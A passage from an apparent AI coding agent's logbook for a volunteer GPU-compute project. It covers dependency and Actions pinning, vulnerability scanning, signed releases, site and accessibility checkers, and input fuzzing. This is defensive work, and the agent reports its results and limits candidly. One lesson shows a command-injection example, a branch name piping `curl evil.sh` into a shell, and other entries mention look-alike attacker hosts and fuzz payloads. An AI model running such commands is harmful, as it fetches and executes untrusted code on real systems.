- **What it doesn't do:** change points, statuses, trust tiers or who audits. Weakly confirmed points stay paid until scoring v2 (your decision) says otherwise. The report holds no prompts or answers, but it names who checked whom, so it is operator-only.
- **Proof.** 12 new tests (638 total with the logbook session's, all passing), using the real API: a rig that confirmed a later-caught rig's work becomes a lead; a caught rig acting as auditor makes the result it confirmed weak; a tie-breaker that sided with a later-caught rig is a lead; rigs that outvoted the cheater are *not* leads; passing an aimed hidden test clears the warning but keeps the lead on the list; revoked leads aren't warned about; the CLI changes nothing in the database; no answers or prompts appear in the report. I then broke the code 11 ways (everyone counted as caught, "weak" meaning any caught partner, no caught-pairs-first order, revoked or caught rigs in the warning, passed tests ignored, a rig paired with itself, outvoted results counted as agreeing, no token check, only the original considered, wrong hidden-test count); two survived the first round (they only show up with three agreeing rigs or a particular ordering), so I added a focused test, and now every one is caught. Not run against a live coordinator: confirmations only happen on AI jobs, which need llama-cli and a model. Software only; nothing here touches the GPUs.
- **Honest limits:** it only starts once one ring member is caught; on a small network almost every rig will be a lead at first (honest rigs agree with a cheater whenever the cheater happened to be honest); and sending the tests is still a manual step.

**What you learned**
1. **Agreement is only as good as who agrees.** "Two rigs got the same answer" proves something only if the two rigs are independent. When one turns out to be a cheater, every "yes" it gave or got loses its value.
2. **Look backwards when you catch someone.** Banks do this with fraud: when one account is caught, they review every account it traded with. Catching one cheater is a lead to the next one.
3. **A lead is not a verdict.** Most rigs on the list will be honest. The fair response is a cheap test everyone honest passes (a hidden known-answer job), not a penalty.
4. **Test the tests.** Breaking the code on purpose showed two gaps in the first set of tests. A test suite you've never seen fail doesn't prove much.

## 2026-11-23 (15:25 UTC): One command to test every rig that agreed with a caught rig (0.5.44)

**Shipped**
- **The gap.** Last session's vouch check lists the rigs that agreed with a rig that was later caught ("leads"), and says the fair next step is a hidden known-answer test aimed at each. But sending them was by hand, one rig at a time, and nothing told you which rigs already had a test on the way. Run it twice and the same rig would get two tests (wasting your private stock and making that rig's tests easier to spot).
- **The vouch check now knows what's waiting (`lead-tests-v1`).** Each lead shows `open_aimed_tests` (hidden tests aimed at it by name that it can still take before their deadline) and `task_types` (the kinds of job it agreed on). A new list, `leads_to_test`, is the unchecked leads with nothing waiting. The health warning adds "N already have one waiting".
- **`python -m app.challenge_pool issue-leads`.** Reads that list from the coordinator and aims **one** test from your private pool at each rig on it, picking a test of a job type the rig actually agreed on (an AI-job lead gets an AI test, not a practice SHA-256 one; `--task` overrides). It goes through the same safe path as `issue`: each test is crossed off before it's sent, put back only if the coordinator clearly refused it, and a test a ledger copy already revealed is retired and another one tried. `--dry-run` shows who would get a test and sends nothing. `--max` (default 10) limits how many rigs per run, most suspicious first. It refuses an older coordinator that can't say what's waiting, stops at the first refusal, and prints only rig names and job ids.
- **Proof.** 656 tests, all passing (18 new). On the way, the tests caught a real bug in my first version: with two leads, both waiting tests were counted against the same rig, so the second run sent another test to the other one. The cause was a database column name clash (the jobs table already has a `worker_id` column, so grouping by my `worker_id` label grouped by the wrong thing). Fixed and kept the test. Then I broke the code 12 ways (expired tests counted, tier tests counted, waiting tests ignored, any task type used, dry run sending, no retry after a retired test, `--max` ignored, guessing on an old coordinator, not stopping, bad task type accepted, health note missing twice); one survived at first (tier tests counted), so I added a direct check, and now all 12 are caught. I also ran it against a real coordinator here: dry run worked, a wrong token was refused with exit 2. It couldn't send to real leads, because leads only come from confirmed AI jobs, which need llama-cli and a model. Software only; nothing here touches the GPUs.
- **Honest limits:** you still run it yourself (nothing is sent automatically); it only matters once the pool has real answers from the pinned model; tier-aimed tests don't count as "waiting" because the rig they land on is picked at hand-out.

**What you learned**
1. **Make the safe thing easy.** A follow-up that takes ten manual commands gets skipped. One command that's safe to run twice gets run.
2. **"Safe to run twice" is a feature you design.** The trick is checking what's already in flight before sending more. Programmers call this *idempotent*: doing it again changes nothing.
3. **Names can collide in surprising places.** In SQL, the label I gave a calculated column had the same name as a real column, and the database picked the real one. The bug only showed up with two rigs, which is why tests with more than one of something matter.
4. **Dry runs build trust.** Seeing exactly who would get a test, before anything is sent, lets you sanity-check a tool you didn't write.

## 2026-11-23 (17:20 UTC): A checker for the live website's headers, redirects and links (0.5.45)

**Why this, why now.** The GPU prototype's software work is done up to what needs the real rig or your decisions, so I took the next website item that needs neither: TASKS.md has had "Verify `_headers` on the live Netlify URL" and "Verify HTTPS, security headers and share card on the live URL" open since the site went live.

**Shipped**
- **`python -m app.site_check static`** (reads files only; CI now runs it whenever a page, `_headers`, `netlify.toml` or `assets/` changes). It checks:
  - `_headers` gives every page the security headers: HSTS for at least 180 days, `nosniff`, a referrer policy that doesn't leak full addresses, a Content-Security-Policy, and framing by other sites blocked;
  - everything each page loads (scripts, styles, images, icons, frames, form targets, and URLs its scripts `fetch()`) is allowed by that CSP. If not, the browser silently blocks it and the page breaks only on the live site;
  - every local link and file exists (with Netlify's pretty URLs, so `/contribute` means `contribute.html`), and nothing links into a folder `netlify.toml` hides (`/docs/`, `/prototype/`, ...);
  - pages with a share card have a title, description, image and `twitter:card`, the image is on this site and exists, and its stated size matches the real file.
- **`python -m app.site_check live --url https://boatsnhoes.meme`** asks the real site, without following redirects: each main page answers 200 with *exactly* the values in `_headers`; `http://` redirects to `https://` on the same host; `www.` redirects to the bare domain; a real file inside each hidden folder answers 404, not 200; and the homepage's share image loads as an image. HTTPS certificates are checked by the request itself. Plain GET requests only, like a browser; it changes nothing.
- **One-click version on GitHub:** a new workflow, **Actions > site-check > Run workflow**, runs the live check and keeps the JSON report. It only appears once this PR is merged into main. No secrets needed.
- **Result on the repo today:** 0 problems, 3 notes: the homepage has no canonical URL (it's your homepage, so I didn't add one; it's in USER_TODO as optional), and the 404 and thanks pages have no share card (fine).
- **Proof.** 37 new tests, 693 total, all passing. The live check runs against a real local web server and against a fake site that I break in specific ways (http not redirecting, redirecting to a look-alike host such as `example.test.evil`, www going elsewhere, a header dropped or changed, a page 404ing, a hidden folder served, a share image that's really HTML, the site unreachable). Then I broke the checker itself 20 ways; 18 were caught at once. The 2 that survived were real test gaps: `*.googleapis.com` also matching `evilgoogleapis.com`, and a www redirect to any site counting as fine. I added a test for each, and now all 20 are caught.
- **Honest limits:** I could **not** run the live check against boatsnhoes.meme: this sandbox's network blocks the site (the run is recorded as "could not connect", not as a pass). So the TASKS items stay open until the workflow runs once. Links to other sites (GitHub) aren't fetched. If Netlify adds its own HSTS header on top of ours, the live check will show the combined value as a mismatch; that would be worth knowing, not a crisis. No site page changed in this session, so there was no layout to check at 390 px.

**What you learned**
1. **Headers are invisible instructions.** Every page comes with a few lines the visitor never sees ("only load scripts from here", "never let another site frame this page"). `_headers` is where you write them; the live check confirms Netlify actually sends them.
2. **A CSP fails quietly.** If the policy forbids something a page uses, the browser just doesn't load it and the page looks broken with no error for the visitor. Checking every page against the policy before deploy catches that early.
3. **Don't follow the redirect when testing the redirect.** To know that `http://` really sends people to `https://`, you have to look at the first answer, not where you end up, so the checker turns redirect-following off.
4. **"Starts with" is a classic security bug.** `https://boatsnhoes.meme.evil.com` starts with `https://boatsnhoes.meme`. Checking for the trailing `/` (`https://boatsnhoes.meme/`) is what makes the match exact.

## 2026-11-23 (18:25 UTC): Every installed package pinned, hash-checked and license-reviewed (0.5.46)

**Why this, why now.** PR #5 had green CI and no conflicts, and the GPU prototype's remaining items need the rig or your decisions. The implementation prompt's security rules still had one open line: "Pin dependencies where practical and review licenses." Until now, `pip install -r requirements.txt` took whatever versions inside a range were newest that day, so two installs a week apart could run different code, and nobody had written down what licenses we ship.

**Shipped**
- **`prototype/requirements.lock`.** All 31 packages the prototype installs (the 8 we ask for plus the 23 they pull in) at one exact version each, with the sha256 fingerprint of every file. Installing with `pip install --require-hashes -r requirements.lock` refuses any file whose fingerprint doesn't match. Made with a **7-day cooldown**: only releases at least a week old, because a hijacked package is usually caught within days of being published.
- **`prototype/licenses.json`.** Each package's license at its locked version, a plain sentence on why it's there, and the allowed list (MIT, MIT-0, BSD, Apache-2.0, ISC, PSF-2.0, MPL-2.0). Everything is permissive; the only MPL-2.0 one is `certifi` (the list of trusted HTTPS certificates), which we use unchanged, so it asks nothing of us.
- **`python -m app.deps_check lock`** (reads files only): every package pinned with `==` and hashed; no line that points pip at another package index, a web address or a local folder; every package in `requirements.txt` is in the lock inside its allowed range; and `licenses.json` matches the lock version for version. A new package or a version bump **fails CI until someone reads its license** and updates the entry.
- **`python -m app.deps_check installed`**: the environment it runs in has exactly the locked versions, and each package's own license metadata says the same thing as our review.
- **CI** now installs from the lock with `--require-hashes` and runs both checks before the tests. The quick start in `prototype/README.md` uses the lock too. I added `packaging` to `requirements.txt` because the checker uses it directly.
- **Proof.**
  - 71 new tests, 764 total, all passing on Python 3.11 (what CI uses) and 3.12 (Ubuntu 24.04's default, likely your rig's), both installed from the lock.
  - I broke the checker 18 ways on purpose (hash not required, `>=` accepted, other indexes allowed, OR read as AND and the reverse, license exceptions accepted, stale or outdated license entries ignored, Windows-only packages required everywhere, wrong versions ignored, files overwritten, duplicates and web addresses allowed, uppercase hashes accepted, ...). All 18 were caught.
  - **The real thing:** I changed one package's fingerprints in a copy of the lock and asked pip to install it. pip stopped with "THESE PACKAGES DO NOT MATCH THE HASHES ... someone may have tampered with them" and installed nothing.
  - A fresh clone, following the quick start word for word, installed from the lock, made a signing key, started the coordinator (`/health` said ok) and made an enrollment code, and left no untracked files behind.
- **Honest limits:** a matching hash proves you got the same files as the day the lock was made, not that those files are safe. No scan for known security holes runs yet (I tried to fetch a scanner on the fly and this sandbox's safety check refused it; turning on Dependabot alerts is an optional one-click item in USER_TODO). The GitHub Actions in CI are pinned by version tag, not by commit (new TASKS item). Updating the lock needs a tool called `uv` (commands at the top of the file). Nothing here touches the GPUs or the website.

**What you learned**
1. **A version range is a promise about the future you can't check.** `fastapi>=0.110,<1` means "whatever's newest that day". A lock file turns that into one exact, repeatable list, so the code you tested is the code you run.
2. **A hash is a fingerprint for a file.** Change one byte of a download and its sha256 is completely different. Writing the fingerprint down in advance means a swapped file is caught *before* it runs, not after.
3. **Waiting a week is a cheap defense.** Most hijacked packages are found and pulled within days. Only accepting releases that have been out for 7 days lets the rest of the world find them first.
4. **Licenses are part of what you ship.** Every package comes with rules. Writing each one down, and making CI fail when a new package arrives unread, means a restrictive license can't sneak in through a dependency of a dependency.

## 2026-11-23 (19:20 UTC): CI's GitHub Actions pinned to exact commits, and a checker that keeps them that way (0.5.47)

**Why this, why now.** PR #5 had green CI and no conflicts, and the GPU prototype's remaining items need the rig or your decisions. Last session added a TASKS item: "Pin the CI workflow's GitHub Actions to commit hashes instead of version tags." It's the same idea as the pinned Python packages, applied to the tools that run our tests.

**Shipped**
- **Both workflows pinned.** `actions/checkout@v4` and `actions/setup-python@v5` are now named by full 40-character commit hash, with `# v4, as of 2026-11-23` / `# v5, ...` on the same line so a person can still read them. **Where the hashes came from:** this repo's own CI log. When GitHub runs a step it writes "Download action repository 'actions/checkout@v4' (SHA:11d5960a...)"; I read those lines from the 18:25 UTC run and used exactly those. So CI now runs the same code it ran today, not whatever the tag points at tomorrow.
- **`persist-credentials: false` on checkout.** By default, checkout leaves the job's GitHub token in `.git/config`, where every later step (including our 800+ tests) could read it. Nothing needs it, so it's gone.
- **One less outside action.** The site-check workflow used `actions/upload-artifact` to keep its report. Instead, the JSON report is now written to the run's **summary page** (you open the run and it's right there). Fewer outside actions = fewer things to trust.
- **`python -m app.workflow_check`** (reads files only; CI runs it, and CI now also runs whenever a workflow file changes). It fails when:
  - a `uses:` names a tag or branch (`@v4`, `@main`), a short or uppercase hash, or a docker image without a `@sha256:` digest;
  - a pinned action has no version comment, or the same action is pinned to two different commits in two workflows;
  - the action's owner isn't on a reviewed list (today only `actions`, GitHub's own; e.g. `tj-actions/...` fails even when pinned);
  - a workflow has no top-level `permissions:`, or asks for any `write` access (top level or per job);
  - it uses the `pull_request_target` or `workflow_run` triggers (both run with this repo's access on code someone else can start);
  - `actions/checkout` doesn't set `persist-credentials: false`;
  - a `run:` script contains `${{ ... }}` (values must go through `env:` instead).
- **Proof.** 61 new tests, **825 total, all passing** (Python 3.11, installed from the lock). The checker passes on both real workflows (22 checks) and failed on the old ones (7 problems: 5 actions pinned only by tag, and 2 checkouts leaving the token behind). Then I broke the checker 16 ways on purpose (accept uppercase or 12-character hashes, miss the YAML `on:` quirk, ignore checkout tokens, ignore `${{ }}` in scripts, allow two hashes, accept any owner starting with "actions", ignore `write-all` or job-level write, skip the missing-permissions check, read only the first comment, accept a version anywhere in the comment, accept docker tags, forget `workflow_run`, skip flow-style `uses`, skip job-level reusable workflows). 15 were caught at once; the "version anywhere in the comment" one survived until I added a `# v4x` test case. Now all 16 are caught.
- `pyyaml` (already in the lock, license already reviewed) is now listed in `requirements.txt`, because the checker uses it directly.
- **Honest limits:** the checker can't prove a hash really is the release its comment says; mine came from GitHub's own log of our CI, which is about as good as it gets without looking at other repositories. Pinned actions don't update themselves; an optional Dependabot file for that is in USER_TODO (it opens pull requests, so it's your call). The site-check workflow's new summary step only runs after merging, when you click Run workflow. Nothing here touches the GPUs or the website.

**What you learned**
1. **A tag is a sticky note; a commit hash is a fingerprint.** `@v4` points wherever the action's owner (or someone who took over their account) moves it. A 40-character hash names one exact version of the code forever.
2. **This attack really happened.** In March 2025 the popular `tj-actions/changed-files` action was hijacked and its tags moved to code that printed secrets into public CI logs. Workflows pinned by hash weren't affected.
3. **Give tools the least access that works.** Our CI only needs to read the code, so its token is read-only and isn't left on disk afterwards. If something in CI ever goes wrong, there's less it can do.
4. **`${{ }}` is copy-paste, not a variable.** GitHub pastes the value into the script *before* it runs, so a branch named `x"; curl evil.sh | sh; "` becomes part of your command. Putting it in `env:` makes it plain data.

## 2026-11-24 (UTC): Checking our pinned packages for known security holes, and the first one it found (0.5.48)

**Why this, why now.** PR #5 had green CI and no merge conflicts (it's waiting on your review, which is the "blocked" GitHub shows). The GPU prototype's open items need the rig or your decisions. The highest unfinished item that needed neither was in Phase 4: "Scan locked packages for known vulnerabilities." Two sessions ago we pinned every package to one exact version; this checks whether any of those exact versions is known to be broken.

**Shipped**
- **`python -m app.vuln_check`.** For each of the 32 locked packages it asks PyPI (the Python package index) about that exact version. PyPI's answer includes the known security problems for it, taken from the OSV database (the same source the popular `pip-audit` tool uses). It only sends package names and versions, and changes nothing.
  - One problem often has 2-3 names (a GitHub `GHSA-...` id, a Python `PYSEC-...` id, a `CVE-...` number). They're merged and shown once, with the version that fixes it.
  - If PyPI can't be reached, doesn't know the version, or answers about something else, that package **fails**. "I couldn't check" is never treated as "clean".
- **`prototype/vuln-exceptions.json`** (empty). If one day a problem can't be fixed right away, a person can accept it for now: which package, which problem, a sentence on why it can't hurt us, the review date and an end date at most 90 days later. On the end date it fails again so it gets looked at.
- **New GitHub workflow `vuln-check`** runs it when the lock changes, **every Monday**, and by hand (Actions > vuln-check > Run workflow). If a Monday run fails, GitHub emails you. It's separate from the main CI so a problem published about an old package doesn't block unrelated work.
- **It found a real one on its first run.** `pytest` 8.4.2 (the tool that runs our tests) has CVE-2025-71176: on a computer shared by several users, another user could mess with pytest's temporary folders. Low risk for us (test-only, one-user CI), but the fix was easy, so I raised it to `pytest` 9.2.0 (released 2026-10-27, so it passes our 7-day waiting rule) and re-made the lock changing only pytest. Second run: 32 of 32 clean.
- **Proof.** 45 new tests, **870 total, all passing** on Python 3.11 (what CI uses) and 3.13, installed from the new lock with hash checking. The dependency, license, workflow, logbook and site checks all still pass. I broke the checker 17 ways on purpose (stop merging duplicate ids, treat "couldn't reach PyPI" as a pass, ignore end dates, accept an answer about the wrong version, allow 1-year exceptions, count withdrawn reports, no retry, follow a redirect to another site, case-sensitive ids, an exception for one package excusing another, ...). 16 were caught at once; one (not escaping odd characters in the web address) slipped past a weak test, so I tightened the test and now it's caught.
- **Honest limits:** it only knows problems someone has found and published, so a pass means "nothing known today", not "safe". It covers the Python packages only, not llama.cpp, the GPU driver or the operating system. The workflow first runs after this is merged.

**What you learned**
1. **Pinning and scanning are two halves.** Pinning makes sure you get the same files every time. Scanning tells you when those same files turn out to have a hole. Without scanning, a pin can keep you on a bad version forever.
2. **A CVE is a public ID for one security problem** (like a case number). The same problem often also gets a GitHub id and a Python id, which is why the tool merges them.
3. **"Couldn't check" must never look like "all clear".** A scanner that quietly passes when the network is down gives you false comfort exactly when you can't see anything.
4. **Exceptions should expire.** "We'll accept this for now" turns into "forever" unless something forces a second look; the 90-day end date is that something.

## 2026-11-24 (UTC): Signed worker releases, so no single person (or stolen key) can push a bad download (0.5.49)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). The GPU items need the rig or your decisions. The highest unfinished item that needed neither was in Phase 4 Security: "Signed miner releases with checksums (multi-signer)". It answers SECURITY threat #2 (fake miners: "download the new version here") and #8 (one person's key being enough).

**Shipped**
- **`python -m app.release`** with four commands:
  - `keygen`: each signer makes their own private key once. It's saved readable by them only, never overwrites an old key, and is refused inside any git folder so it can't be committed by accident. It prints one line (the public half) to send you.
  - `make`: takes a clean checkout and writes `release.json`: every file git tracks, with its sha256 fingerprint and size, plus the commit it came from. It also writes a plain `SHA256SUMS` file, so anyone can check the files with the standard `sha256sum -c` command, no special tools. Files git doesn't track (`.env`, keys, databases) are never included.
  - `sign`: each signer adds their signature on their own computer. One signature per person and per key; it won't sign a broken or mixed-up release.
  - `verify`: what a rig runs before starting new worker code. It passes only when **at least 2 different people from your pinned signer list** signed exactly this release, every signature from a listed person is valid, and (with `--root`) every file on disk matches, nothing is a shortcut (symlink), and no extra Python file has been slipped in. `--not-older-than` refuses an old signed version (so nobody can hand a rig an old release with a bug we already fixed).
- **Proof.**
  - 54 new tests, **924 total, all passing** (Python 3.13 here; CI runs 3.11).
  - I broke the tool 20 ways on purpose (allow 1 signer, count one person twice, accept a listed name with someone else's key, drop the signature's purpose label, skip the "signed this exact release" check, compare only file sizes, treat an extra `.py` file as harmless, ignore symlinks, ignore paths outside the folder, ignore the version floor, overwrite releases, allow uncommitted changes, allow keys in git folders, ...). 19 were caught at once. "Ignore symlinks" survived because my only symlink test pointed outside the folder (caught by a different check), so I added a test with a shortcut *inside* the folder. Now all 20 are caught.
  - **Real run on this repo:** I made a release of `prototype/` (93 files), signed it with two throwaway test keys, and `sha256sum -c` agreed with every file. `verify` then said **NOT OK** because the two new files from this session weren't committed yet, which is exactly what it should say about Python files outside the release.
- **Honest limits:** a valid release means enough named people agreed to ship exactly these files. It doesn't prove the code is safe or that a signer's computer was clean. It covers the worker's Python files, not llama.cpp, model files (those already have their own pins) or the operating system. **No real signers exist and nothing has been signed yet:** picking at least 2 people is your call (USER_TODO, "Set up multiple release signers").

**What you learned**
1. **A checksum says "same file"; a signature says "who vouches for it".** A sha256 list alone can be swapped along with the files. A signature over that list ties it to a person's key.
2. **"2 of 3" beats "1 of 1".** If one signer's laptop is stolen, the thief still can't publish a release alone. That's the same idea banks use for vaults with two keys.
3. **The rig must already know who the signers are.** If a download could bring its own signer list, a fake download would bring a fake list. That's why the list is pinned on the rig ahead of time.
4. **Old but genuine can still hurt.** A properly signed old version may contain a bug we fixed later; refusing anything older than a set version stops that "rollback" trick.

## 2026-11-24 (10:20 UTC): An accessibility check for every page, and what it found (0.5.50)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, and the website rules allow accessibility work that needs no owner call. Nothing checked whether the site works for people using a screen reader, a keyboard instead of a mouse, zoom, or "reduce motion", or whether text is readable against its background.

**Shipped**
- **`python -m app.a11y_check`** (reads files only; CI now runs it on every site change). For each page it reads the HTML and the CSS the page loads and checks:
  - the page says its language, has a title, and lets phones zoom in;
  - every image has a description (`alt`, empty for decoration), and drawings are either hidden from screen readers or labelled;
  - every link and button has words a screen reader can say, and every form field has a label (a grey hint inside the box doesn't count);
  - one main heading, no skipped heading levels, one main area, and a "Skip to content" link first on pages with a menu that really lands in the main area;
  - no duplicate ids, no labels pointing at nothing, no forced keyboard order, nothing reachable by keyboard but hidden from screen readers;
  - **text contrast** of at least 4.5:1 (the common WCAG AA bar) against the background the text really sits on: its own, or a parent's (a card, a button, an inline style), every stop of a colour gradient, see-through colours blended; the keyboard focus ring at least 3:1; a "reduce motion" rule whenever something moves.
  - Colours it can't read are listed as notes, never quietly passed.
- **Your homepage is checked but never failed.** It's your approved design, so its findings are notes; CI stays green.
- **Result: all 4 subpages (/contribute, /reports/, /thanks, 404) pass with nothing to fix.** The homepage has 7 notes, the biggest being white text on the light-orange "Get Started" button (1.8:1). I didn't touch it; the list is in USER_TODO.
- **Second opinion.** I ran axe-core 4.10.2 (the most widely used open-source accessibility engine) in a real Chromium browser at desktop (1440 px) and phone (390 px) widths. Subpages: **0 problems**, including /contribute after pressing "Check this device" (content a script adds, which my file-reading check can't see), and no sideways scrolling. Homepage: it agreed on the heading jump and found one thing mine doesn't check (an `<aside>` inside `<main>`). It also showed why mine is useful: axe doesn't judge text on gradients at all ("needs review"), which is exactly where the homepage button problem is.
- **Proof.**
  - 70 new tests, **994 total, all passing** (Python 3.13, installed from the hash-checked lock). Workflow, site, dependency and license checks all still pass.
  - The first version wrongly flagged three homepage things (text in the orange box judged against the black page; an empty decorative dot; a green label whose inline style was ignored) and missed that the logo link isn't a skip link. I wrote a failing test for each, then fixed the checker.
  - I broke the checker 20 ways on purpose (lower the 4.5 bar, ignore see-through colours, check only the first gradient colour, count hidden text, accept a placeholder as a label, ignore which CSS rule wins, ignore inline styles, treat `>` like any descendant, skip `:hover` colours, fail your homepage, ...). 15 were caught at once; the other 5 slipped past tests that weren't sharp enough, so I added those tests. Now all 20 are caught.
- **Honest limits:** it's a file reader, not a screen reader. It can't judge wording, it compares text a script adds later with the page background, and unusual CSS selectors fall back to that too. A pass means "none of these known problems", not "fully accessible". Nothing on the live site changed.

**What you learned**
1. **Contrast is a number.** It's the brightness of the lighter colour divided by the darker one (with a small offset), from 1:1 (invisible) to 21:1 (black on white). 4.5:1 is the usual minimum for normal text; your white-on-light-orange button is 1.8:1, which is hard to read in sunlight or with weaker eyesight.
2. **A screen reader reads names, not pictures.** A logo link with no text is announced as just "link". An `aria-label="Boats n Hoes home"` gives it words; `alt=""` tells it an image is only decoration.
3. **Keyboard users need a shortcut past the menu.** A hidden "Skip to content" link that appears when you press Tab saves pressing Tab through every menu item on every page.
4. **Two tools beat one.** Each checker had a blind spot the other covered (gradients for axe, script-made content for mine), so running both found more than either alone.

## 2026-11-24 (UTC): A "Stay safe" page, because fakes show up before the real coin does (0.5.51)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. On the website list, "Rebuild or upload Mine, Tokenomics, Stay Safe pages" was open; Mine and Tokenomics depend on supply and launch choices you haven't made, but Stay Safe doesn't. It answers SECURITY threat #2 (fake sites, fake miners, wallet drainers, fake admins), which is the most likely way someone gets hurt by this project's name before anything exists.

**Shipped**
- **New page `/stay-safe`** (`stay-safe.html`, same orange/black style as /contribute and /reports/):
  - A plain callout: **there is no $BNH coin** (no token, presale, airdrop, wallet, exchange listing, casino or miner download). Anyone selling one is not us.
  - **Six "we will never" rules** people can test any message against: ask for a recovery phrase, DM first, sell early coins, ask you to connect a wallet, send software by DM (or need admin rights / antivirus off), promise money.
  - **Only two official places:** boatsnhoes.meme and the GitHub repo, with the common look-alike tricks (swapped letters, extra words, other endings). Social accounts are listed as **"not announced yet"**; I didn't invent any handles.
  - **How to check a download** once one exists: `sha256sum -c` and the signed-release check from 0.5.49 (at least two named signers, signer list posted first). It says clearly that nothing is released yet.
  - **How to report a fake** (a GitHub issue) and a security hole (an issue *without* details, so it isn't made public), and what to do after a loss (and that "recovery services" charging a fee are a second scam).
- **Linked** from the footers of /contribute and /reports/ and from the contribute FAQ answer about scam DMs. **Your homepage is unchanged.** A tiny new `assets/nav.js` only opens and closes the phone menu.
- **A guard for every subpage:** new tests fail if any subpage (homepage excluded) says things like "to the moon", "100x", "guaranteed", "risk-free", "earn $50", "presale is live" or "claim your", including in the hidden share-card text. They also check the safety page keeps its honest statements, links only to our own site and GitHub, and passes the website and accessibility checkers.
- **Proof.**
  - 31 new tests, **1,025 total, all passing** (one release test only runs once the work is committed, as designed). Website check: 15 pass, 3 notes, no failures. Accessibility check: all 6 pages pass (homepage notes unchanged).
  - In a real Chromium browser at phone (390 px), tablet (768 px) and desktop (1440 px) widths: no sideways scrolling, the phone menu opens and closes, no script errors.
  - I broke things 12 ways on purpose (removed each footer link, slipped in "Presale is live!" and "To the moon", hype in the share-card description, a Telegram link, removed the "no coin" line, an image without alt text, a broken share card, risky code in nav.js, dropped the page from the live check). All were caught, but two only after I sharpened the tests: the "no coin" line also lived in the share-card text, and the FAQ link hid a missing footer link.
- **Honest limits:** a word list can't catch every hype claim, only the common ones; it's a safety net, not an editor. The page is advice, not protection: it only helps people who read it. If you have your own Stay Safe draft, it can replace this one (USER_TODO).

**What you learned**
1. **Scammers move first.** A recognisable name with no real coin yet is the perfect bait: fake presales and "airdrops" can't be compared against anything real, so a page saying "none of this exists" is the comparison.
2. **Rules beat logos.** Logos and screenshots are easy to copy. "We never DM first and never ask for your recovery phrase" can't be faked, because the scam needs to break it.
3. **The recovery phrase is the wallet.** Whoever has those 12 or 24 words owns the money; no real support person ever needs them.
4. **Report security holes quietly.** Posting the details publicly helps attackers before it's fixed; that's why the page asks for an issue with no details (and why turning on GitHub's private reporting is on your list).

## 2026-11-24 (12:30 UTC): Throwing junk at every door of the coordinator, and the five things that broke (0.5.52)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. "Code audit" was open, and the cheapest useful first step needs nobody's decision: send every API route broken and hostile input and see what crashes. Before strangers can reach the coordinator, it should refuse bad requests politely instead of falling over.

**Shipped (`input-limits-v1`)**
- **A fuzz of every route** (`tests/test_input_limits.py`). With valid operator, submitter and worker logins, each route gets odd path segments (`%00`, `../`, 5,000 letters), odd query values, 11 broken bodies (empty, `null`, `1e999`, cut-off JSON, 3,000 brackets, invalid bytes) and 19 hostile values in each field of a valid example (huge and negative numbers, NUL, newlines, right-to-left marks, 10,000 letters, SQL-looking text, lists, objects): about 1,000 requests. The rule: refusing is fine, crashing (`5xx`) or showing a stack trace is not. A new route or request type without an example makes it fail, so it can't quietly go stale.
- **What it found, and the fixes:**
  1. **No size limit on what you send.** Anyone, no login needed, could send a 1 GB body and the coordinator read all of it into memory before saying "too long". Now anything over **256 KiB** (`MAX_BODY_BYTES`) gets `413 Payload Too Large`: straight away if the request says its size up front (not one byte read), or the moment a request that doesn't say its size passes the limit. The biggest honest request is about 150 KB, so nothing real is affected.
  2. **Nested brackets crashed the request.** `[[[[...` 5,000 deep made Python's JSON reader give up with a `500` and a stack trace in the log. Now anything nested deeper than 32 levels gets `400` before it's read as JSON. Real requests nest at most 2 deep.
  3. **Error messages repeated what you sent.** When a field was wrong, the `422` reply quoted it back: a secret pasted into the wrong box, or a 4 MB string. And `1e999` (which Python reads as infinity) couldn't be written back out, so the error message itself crashed into a `500`. Errors now say only what was wrong and where.
  4. **Numbers too big for the database.** Asking for a reward report "until 2^70" crashed SQLite (`OverflowError`). Dates are now limited to 0 through 2^53 (about 285,000 years from now).
  5. **A worker could claim it started a job before time began.** `started_at = -2^70` was accepted. Now 0 or later.
  - Also: **worker names are plain** (3-80 of letters, digits, `. _ : -`), so a name can't sneak a newline, an invisible character or HTML into logs, reports or pages; **capability lists** are at most 16 short lowercase names.
- **Refused requests still count.** The new check runs inside the request logger and the per-address speed limit, so a flood of oversized requests still gets logged (path and status only, never the body) and still gets slowed down with `429`.
- **Proof.**
  - 38 new tests, **1,063 total, all passing** (Python 3.13, installed from the hash-checked lock; one release test is skipped until the work is committed, as designed).
  - Checked on a real web server (uvicorn), not just the test client: a 1 MB body got `413`, the same 1 MB sent without a size got `413`, 5,000-deep brackets got `400`, `/health` stayed `200`, no stack trace in the log.
  - I switched each fix off on purpose, 13 ways (no up-front size check, no cut-off while reading, off-by-one at the limit, no depth check, counting brackets inside text, echoing input, no error handler, unbounded report dates, negative start times, unlimited capabilities, any worker name...). 11 were caught at once. The other 2 slipped past: the up-front size check (the cut-off while reading covered for it, so I added a test that fails if even one byte is read), and one report date (my break hit `since`, which another check already covers; breaking `until` was caught).
- **Honest limits:** a fuzz only finds what it tries. It checks single requests, not a client that sends one byte a minute (the web server's timeouts handle that) or a flood from thousands of addresses (needs a protected host before going public, threat model #17). It's a first pass of the code audit, not the audit.

**What you learned**
1. **Check the size before you read.** A server that reads the whole request and *then* checks it has already spent the memory. The `Content-Length` header lets it say no first; for requests without one, it counts as it reads and stops at the limit.
2. **Fuzzing is throwing junk on purpose.** Instead of guessing which bad input matters, send lots of kinds to every door and only ask "did anything crash?". It found 5 problems no one had written a test for.
3. **Error messages can leak.** Repeating someone's input back is friendly for debugging, but it can repeat a secret or a huge payload. Saying *where* the problem is ("body → enrollment_code: wrong type") is enough.
4. **Computers have number limits.** Python can handle any size of whole number, but SQLite stops at about 9.2 quintillion (2^63). Passing a bigger one across that border crashes unless something checks first.

## 2026-11-24 (13:20 UTC): Turning the junk test around: a fake coordinator against the worker (0.5.53)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. Last session threw junk at the coordinator; this session does the same to the **worker**, which matters more for your volunteers: the worker runs on *their* machine, and it talks to whatever answers at the address it was given. A typo, a fake "official coordinator" link, or someone on the same Wi-Fi could be on the other end.

**Shipped (`worker-input-v1`)**
